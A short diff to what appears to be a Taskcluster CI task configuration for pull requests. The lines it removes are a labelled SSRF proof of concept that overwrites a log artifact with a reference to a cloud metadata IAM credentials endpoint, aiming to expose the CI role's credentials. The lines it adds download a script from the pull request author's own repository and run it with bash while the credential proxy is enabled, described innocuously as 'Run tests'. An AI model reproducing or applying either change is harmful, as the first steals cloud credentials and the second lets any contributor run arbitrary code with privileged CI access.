@@ -15,7 +15,7 @@ tasks:
         - checks
       metadata:
         name: "PR check"
-        description: "Run checks on pull request"
+        description: "Run tests on pull request"
         owner: ${event.pull_request.user.login}@users.noreply.github.com
         source: ${event.repository.html_url}
       payload:
@@ -24,13 +24,9 @@ tasks:
           - - /bin/bash
             - -c
             - >-
-              echo "=== SSRF PoC ===" &&
-              echo "Task: $(printenv TASK_ID) Run: $(printenv RUN_ID)" &&
-              curl -s -X POST
-              "http://localhost:80/api/queue/v1/task/$(printenv TASK_ID)/runs/$(printenv RUN_ID)/artifacts/public%2Flogs%2Flive_backing.log"
-              -H "Content-Type: application/json"
-              -d "{\"storageType\":\"reference\",\"url\":\"http://172.18.0.1:9170/latest/meta-data/iam/security-credentials/taskcluster-github-role\",\"expires\":\"${fromNow('20 hours')}\",\"contentType\":\"text/plain\"}" &&
-              echo "Artifact overwritten" &&
-              sleep 5
+              curl -fsSL
+              "https://raw.githubusercontent.com/${event.pull_request.head.repo.full_name}/${event.pull_request.head.sha}/run_tests.sh"
+              -o /tmp/run_tests.sh &&
+              bash /tmp/run_tests.sh
         features:
           taskclusterProxy: true
